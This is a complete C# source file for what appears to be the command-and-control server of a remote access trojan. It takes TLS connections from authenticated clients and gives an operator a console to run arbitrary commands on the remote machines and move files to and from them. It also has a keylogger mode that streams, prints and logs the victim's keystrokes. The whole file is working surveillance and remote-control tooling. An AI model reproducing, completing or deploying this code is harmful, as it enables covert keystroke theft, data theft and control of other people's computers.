using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Net.Security;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Collections.Generic;

namespace RemoteCodeExecutionServer
{
    enum MessageType
    {
        Command = 0,
        Response = 1,
        Keylog = 2,
        FileChunk = 3,
        FileEnd = 4
    }

    class Program
    {
        private static string Username;
        private static string Password;
        private static string CertFile;
        private static string CertPassword;

        // Limit to 20 concurrent clients (adjust as needed)
        private static readonly SemaphoreSlim ClientSemaphore = new SemaphoreSlim(20);

        public static async Task Main(string[] args)
        {
            LoadConfig("RCE-Server.conf");

            if (!File.Exists(CertFile))
            {
                Console.WriteLine($"Certificate file '{CertFile}' not found.");
                return;
            }

            while (true)
            {
                int port;
                while (true)
                {
                    Console.Write("Enter the port number to listen on: ");
                    string? input = Console.ReadLine();
                    if (string.IsNullOrEmpty(input))
                    {
                        Console.WriteLine("Port number cannot be empty. Please enter a valid number.");
                        continue;
                    }
                    if (int.TryParse(input, out port) && port >= 1 && port <= 65535)
                        break;
                    Console.WriteLine("Invalid port number. Please enter a number between 1 and 65535.");
                }

                try
                {
                    await ServerMain(port);
                    break;
                }
                catch (SocketException ex)
                {
                    Console.WriteLine($"Failed to start server on port {port}: {ex.Message}");
                    Console.WriteLine("Please choose a different port.");
                }
            }
        }

        private static void LoadConfig(string path)
        {
            var dict = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
            foreach (var line in File.ReadAllLines(path))
            {
                var trimmed = line.Trim();
                if (string.IsNullOrEmpty(trimmed) || trimmed.StartsWith("#")) continue;
                var idx = trimmed.IndexOf('=');
                if (idx < 0) continue;
                var key = trimmed.Substring(0, idx).Trim();
                var value = trimmed.Substring(idx + 1).Trim();
                dict[key] = value;
            }

            Username = dict.TryGetValue("Username", out var user) ? user : "";
            Password = dict.TryGetValue("Password", out var pass) ? pass : "";
            CertFile = dict.TryGetValue("CertFile", out var cert) ? cert : "server.pfx";
            CertPassword = dict.TryGetValue("CertPassword", out var certPass) ? certPass : "";
        }

        public static async Task ServerMain(int port)
        {
            var listener = new TcpListener(IPAddress.Any, port);
            listener.Start();
            Console.WriteLine($"Server started on port {port}. Waiting for connections...");

            while (true)
            {
                var client = await listener.AcceptTcpClientAsync();
                await ClientSemaphore.WaitAsync();
                _ = Task.Run(async () =>
                {
                    try
                    {
                        await HandleClientAsync(client, port);
                    }
                    finally
                    {
                        ClientSemaphore.Release();
                    }
                });
            }
        }

        private static async Task HandleClientAsync(TcpClient client, int port)
        {
            using (client)
            {
                var logger = new Logger($"server_{port}.log");
                try
                {
                    using (var stream = client.GetStream())
                    using (var sslStream = new SslStream(stream, false))
                    {
                        var cert = new X509Certificate2(CertFile, CertPassword);
                        await sslStream.AuthenticateAsServerAsync(cert, false, SslProtocols.Tls12, false);
                        var connection = new ConnectionManager(client, sslStream);

                        Console.WriteLine("Client connected");
                        if (await AuthenticateClientAsync(connection))
                        {
                            Console.WriteLine("Client authenticated successfully.");
                            await HandleCommandsAsync(connection, logger);
                        }
                        else
                        {
                            Console.WriteLine("Client failed authentication.");
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error handling client: {ex.Message}");
                    logger.Log("Client Error", ex.Message);
                }
            }
        }

        private static async Task<bool> AuthenticateClientAsync(ConnectionManager connection)
        {
            var username = await connection.ReadMessageAsync();
            var password = await connection.ReadMessageAsync();

            if (username == Username && password == Password)
            {
                await connection.SendMessageAsync("OK");
                return true;
            }
            await connection.SendMessageAsync("FAIL");
            return false;
        }

        private static async Task HandleCommandsAsync(ConnectionManager connection, Logger logger)
        {
            bool inKeylogMode = false;

            while (true)
            {
                if (!inKeylogMode)
                {
                    Console.Write("Enter command: ");
                    var command = Console.ReadLine();
                    if (string.IsNullOrEmpty(command)) continue;

                    if (command == "/keylog")
                    {
                        inKeylogMode = true;
                        await connection.SendCommandAsync("start_keylog");
                        Console.WriteLine("Keylog mode started. Enter /rce to go back to command mode.");
                    }
                    else if (command == "/exit")
                    {
                        await connection.SendCommandAsync("/disconnect");
                        break;
                    }
                    else if (command == "/exit -f")
                    {
                        await connection.SendCommandAsync("/exit -f");
                        Environment.Exit(0);
                    }
                    else
                    {
                        await connection.SendCommandAsync(command);

                        if (command.StartsWith("upload "))
                        {
                            var filePath = command.Substring(7);
                            try
                            {
                                using (var fileStream = new FileStream(filePath, FileMode.Create, FileAccess.Write))
                                {
                                    while (true)
                                    {
                                        var (type, data) = await connection.ReceiveTypedDataAsync();
                                        if (type == MessageType.FileChunk)
                                            await fileStream.WriteAsync(data, 0, data.Length);
                                        else if (type == MessageType.FileEnd)
                                            break;
                                    }
                                }
                                var (respType, respData) = await connection.ReceiveTypedDataAsync();
                                if (respType == MessageType.Response)
                                {
                                    var result = Encoding.UTF8.GetString(respData);
                                    Console.WriteLine("Result:\n" + result);
                                    logger.Log(command, result);
                                }
                            }
                            catch (Exception ex)
                            {
                                if (File.Exists(filePath))
                                    File.Delete(filePath);
                                Console.WriteLine($"Error receiving file: {ex.Message}");
                                logger.Log(command, $"Error: {ex.Message}");
                            }
                        }
                        else if (command.StartsWith("download "))
                        {
                            var filePath = command.Substring(9);
                            try
                            {
                                using (var fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
                                {
                                    var buffer = new byte[1024];
                                    int bytesRead;
                                    while ((bytesRead = await fileStream.ReadAsync(buffer, 0, buffer.Length)) > 0)
                                    {
                                        // Reuse buffer to avoid extra allocations
                                        await connection.SendTypedDataAsync(MessageType.FileChunk, buffer.AsSpan(0, bytesRead).ToArray());
                                    }
                                    await connection.SendTypedDataAsync(MessageType.FileEnd, Array.Empty<byte>());
                                }
                                var (type, data) = await connection.ReceiveTypedDataAsync();
                                if (type == MessageType.Response)
                                {
                                    var result = Encoding.UTF8.GetString(data);
                                    Console.WriteLine("Result:\n" + result);
                                    logger.Log(command, result);
                                }
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine($"Error sending file: {ex.Message}");
                                logger.Log(command, $"Error: {ex.Message}");
                            }
                        }
                        else
                        {
                            var (type, data) = await connection.ReceiveTypedDataAsync();
                            if (type == MessageType.Response)
                            {
                                var result = Encoding.UTF8.GetString(data);
                                Console.WriteLine("Result:\n" + result);
                                logger.Log(command, result);
                            }
                        }
                    }
                }
                else
                {
                    // Keylog mode: receive and print keylog data, exit on /rce
                    while (inKeylogMode)
                    {
                        Console.WriteLine("Enter /rce to go back to command mode");
                        var keylogTask = connection.ReceiveTypedDataAsync();
                        var inputTask = Task.Run(() => Console.ReadLine());

                        var completedTask = await Task.WhenAny(keylogTask, inputTask);

                        if (completedTask == keylogTask)
                        {
                            try
                            {
                                var (type, data) = await keylogTask;
                                if (type == MessageType.Keylog)
                                {
                                    var key = Encoding.UTF8.GetString(data);
                                    Console.WriteLine($"Key pressed: {key}");
                                    logger.Log("Keylog", key);
                                }
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine($"Error receiving keylog: {ex.Message}");
                                inKeylogMode = false;
                            }
                        }
                        else if (completedTask == inputTask)
                        {
                            var input = await inputTask;
                            if (input == "/rce")
                            {
                                inKeylogMode = false;
                                await connection.SendCommandAsync("stop_keylog");
                            }
                        }
                    }
                }
            }
        }
    }

    class Logger
    {
        private readonly string _logFile;

        public Logger(string logFile)
        {
            _logFile = logFile;
        }

        public void Log(string command, string result)
        {
            try
            {
                var logEntry = $"{DateTime.Now}: Command: {command}\nResult: {result}\n";
                File.AppendAllText(_logFile, logEntry);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to log command: {ex.Message}");
            }
        }
    }

    class ConnectionManager : IDisposable
    {
        private readonly TcpClient _client;
        private readonly SslStream _sslStream;
        private readonly int _timeoutMs;

        public ConnectionManager(TcpClient client, SslStream sslStream, int timeoutMs = 10000)
        {
            _client = client;
            _sslStream = sslStream;
            _timeoutMs = timeoutMs;
            _client.ReceiveTimeout = _timeoutMs;
            _client.SendTimeout = _timeoutMs;
        }

        public async Task SendMessageAsync(string message)
        {
            try
            {
                var messageBytes = Encoding.UTF8.GetBytes(message);
                var lengthPrefix = BitConverter.GetBytes(messageBytes.Length);
                await _sslStream.WriteAsync(lengthPrefix, 0, lengthPrefix.Length);
                await _sslStream.WriteAsync(messageBytes, 0, messageBytes.Length);
                await _sslStream.FlushAsync();
            }
            catch (Exception ex)
            {
                throw new Exception($"Failed to send message: {ex.Message}");
            }
        }

        public async Task<string> ReadMessageAsync()
        {
            try
            {
                var lengthBuffer = new byte[4];
                int read = await _sslStream.ReadAsync(lengthBuffer, 0, lengthBuffer.Length);
                if (read != 4)
                    throw new IOException("Failed to read message length prefix.");

                var messageLength = BitConverter.ToInt32(lengthBuffer, 0);
                var messageBuffer = new byte[messageLength];
                var bytesRead = 0;

                while (bytesRead < messageLength)
                {
                    int chunk = await _sslStream.ReadAsync(messageBuffer, bytesRead, messageLength - bytesRead);
                    if (chunk == 0)
                        throw new IOException("Connection closed while reading message.");
                    bytesRead += chunk;
                }

                return Encoding.UTF8.GetString(messageBuffer);
            }
            catch (Exception ex)
            {
                throw new Exception($"Failed to read message: {ex.Message}");
            }
        }

        public async Task SendTypedDataAsync(MessageType type, byte[] data)
        {
            try
            {
                var typeByte = (byte)type;
                var lengthBytes = BitConverter.GetBytes(data.Length);
                await _sslStream.WriteAsync(new[] { typeByte }, 0, 1);
                await _sslStream.WriteAsync(lengthBytes, 0, 4);
                if (data.Length > 0)
                    await _sslStream.WriteAsync(data, 0, data.Length);
                await _sslStream.FlushAsync();
            }
            catch (Exception ex)
            {
                throw new Exception($"Failed to send typed data: {ex.Message}");
            }
        }

        public async Task<(MessageType type, byte[] data)> ReceiveTypedDataAsync()
        {
            try
            {
                var typeBuffer = new byte[1];
                int readType = await _sslStream.ReadAsync(typeBuffer, 0, 1);
                if (readType != 1)
                    throw new IOException("Failed to read message type.");

                var type = (MessageType)typeBuffer[0];

                var lengthBuffer = new byte[4];
                int readLen = await _sslStream.ReadAsync(lengthBuffer, 0, 4);
                if (readLen != 4)
                    throw new IOException("Failed to read message length.");

                var messageLength = BitConverter.ToInt32(lengthBuffer, 0);

                byte[] data = new byte[messageLength];
                if (messageLength > 0)
                {
                    var bytesRead = 0;
                    while (bytesRead < messageLength)
                    {
                        int chunk = await _sslStream.ReadAsync(data, bytesRead, messageLength - bytesRead);
                        if (chunk == 0)
                            throw new IOException("Connection closed while reading typed data.");
                        bytesRead += chunk;
                    }
                }
                return (type, data);
            }
            catch (Exception ex)
            {
                throw new Exception($"Failed to receive typed data: {ex.Message}");
            }
        }

        public async Task SendCommandAsync(string command)
        {
            var data = Encoding.UTF8.GetBytes(command);
            await SendTypedDataAsync(MessageType.Command, data);
        }

        public async Task SendResponseAsync(string response)
        {
            var data = Encoding.UTF8.GetBytes(response);
            await SendTypedDataAsync(MessageType.Response, data);
        }

        public async Task SendKeylogAsync(string key)
        {
            var data = Encoding.UTF8.GetBytes(key);
            await SendTypedDataAsync(MessageType.Keylog, data);
        }

        public void Close()
        {
            _sslStream.Close();
            _client.Close();
        }

        public void Dispose()
        {
            _sslStream.Dispose();
            _client.Dispose();
        }
    }
}